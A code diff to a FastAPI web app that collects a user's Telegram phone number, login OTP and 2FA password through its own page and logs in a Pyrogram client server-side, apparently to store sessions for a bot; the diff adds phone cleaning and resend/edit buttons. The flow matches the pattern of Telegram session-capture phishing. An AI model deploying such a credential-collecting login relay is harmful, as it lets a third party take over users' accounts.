@@ -1,4 +1,5 @@
 import os
+import re
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
@@ -29,6 +30,28 @@ sessions_col = db["sessions"]  # Collection name synced with Bot
 
 # Temporary Memory Storage for Active Telegram Login Sessions
 active_clients = {}
+
+# ---------------------------------------------------------
+# Helper Function for Flexible Phone Cleaning
+# ---------------------------------------------------------
+def clean_phone_number(phone_raw: str) -> str:
+    # फालतू अक्षर, स्पेस, डॉट, डैश सब हटाओ
+    digits = re.sub(r'[^\d+]', '', phone_raw)
+    
+    # अगर + पहले से है
+    if digits.startswith('+'):
+        return digits
+    
+    # अगर 0 से शुरू हो रहा है (जैसे 09876543210)
+    if digits.startswith('0'):
+        digits = digits[1:]
+        
+    # अगर केवल 10 डिजिट का नंबर डाला है (India Default)
+    if len(digits) == 10:
+        return f"+91{digits}"
+        
+    # बाकी सब केस के लिए आगे + लगा दो
+    return f"+{digits}"
 
 # ---------------------------------------------------------
 # Request Models
@@ -141,9 +164,21 @@ HTML_TEMPLATE = """
           <i class="fa-solid fa-shield-halved text-5xl text-green-500 mb-2"></i>
           <h3 class="text-xl font-bold">Enter OTP Code</h3>
           <p class="text-sm text-gray-400 mt-1">Check your official Telegram app for verification code</p>
+          <p id="displayPhone" class="text-xs text-blue-400 font-semibold mt-1"></p>
         </div>
         <input type="text" id="otpInput" placeholder="12345" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-green-500 text-2xl text-center tracking-widest font-mono">
+        
         <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition">Verify & Continue</button>
+
+        <!-- New Action Options: Edit Phone & Resend OTP -->
+        <div class="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-800">
+          <button onclick="goBackToPhone()" class="hover:text-blue-400 flex items-center gap-1">
+            <i class="fa-solid fa-pen-to-square"></i> Edit Number
+          </button>
+          <button onclick="sendCode(true)" id="btnResend" class="hover:text-green-400 flex items-center gap-1">
+            <i class="fa-solid fa-rotate-right"></i> Resend OTP
+          </button>
+        </div>
       </div>
 
       <!-- Step 3: 2FA Password -->
@@ -177,25 +212,42 @@ HTML_TEMPLATE = """
       err.classList.remove('hidden');
     }
 
-    async function sendCode() {
-      userPhone = document.getElementById('phoneInput').value.trim();
-      if(!userPhone.startsWith('+')) return showError("Please include '+' with country code (e.g. +91...)");
+    function goBackToPhone() {
+      document.getElementById('step-otp').classList.add('hidden');
+      document.getElementById('step-phone').classList.remove('hidden');
+      document.getElementById('errorMsg').classList.add('hidden');
+      document.getElementById('btnSendCode').innerText = "Send Code";
+    }
 
-      document.getElementById('btnSendCode').innerText = "Sending...";
+    async function sendCode(isResend = false) {
+      if(!isResend) {
+        userPhone = document.getElementById('phoneInput').value.trim();
+      }
+      
+      if(!userPhone) return showError("Please enter a valid phone number.");
+
+      const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
+      btn.innerText = isResend ? "Resending..." : "Sending...";
+
       const res = await fetch('/api/send-code', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ phone: userPhone })
       });
       const data = await res.json();
+      
       if(res.ok) {
+        userPhone = data.phone; // back from cleaned phone
+        document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
         document.getElementById('step-phone').classList.add('hidden');
         document.getElementById('step-otp').classList.remove('hidden');
         document.getElementById('errorMsg').classList.add('hidden');
       } else {
         showError(data.detail || "Error sending OTP");
-        document.getElementById('btnSendCode').innerText = "Send Code";
       }
+
+      document.getElementById('btnSendCode').innerText = "Send Code";
+      document.getElementById('btnResend').innerHTML = '<i class="fa-solid fa-rotate-right"></i> Resend OTP';
     }
 
     async function verifyOtp() {
@@ -251,8 +303,15 @@ async def serve_ui():
 
 @app.post("/api/send-code")
 async def send_code(data: PhoneReq):
-    phone = data.phone.strip().replace(" ", "")
+    phone = clean_phone_number(data.phone)
     try:
+        # Purana disconnect logic taaki memory leak na ho
+        if phone in active_clients:
+            try:
+                await active_clients[phone]["client"].disconnect()
+            except Exception:
+                pass
+
         client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
         await client.connect()
         sent_code = await client.send_code(phone)
@@ -261,13 +320,13 @@ async def send_code(data: PhoneReq):
             "client": client,
             "phone_code_hash": sent_code.phone_code_hash
         }
-        return {"status": "ok", "message": "OTP sent successfully"}
+        return {"status": "ok", "message": "OTP sent successfully", "phone": phone}
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
 @app.post("/api/verify-otp")
 async def verify_otp(data: OtpReq):
-    phone = data.phone.strip()
+    phone = clean_phone_number(data.phone)
     if phone not in active_clients:
         raise HTTPException(status_code=400, detail="Session expired. Restart process.")
     
@@ -306,7 +365,7 @@ async def verify_otp(data: OtpReq):
 
 @app.post("/api/verify-2fa")
 async def verify_2fa(data: PasswordReq):
-    phone = data.phone.strip()
+    phone = clean_phone_number(data.phone)
     if phone not in active_clients:
         raise HTTPException(status_code=400, detail="Session expired. Restart process.")
     
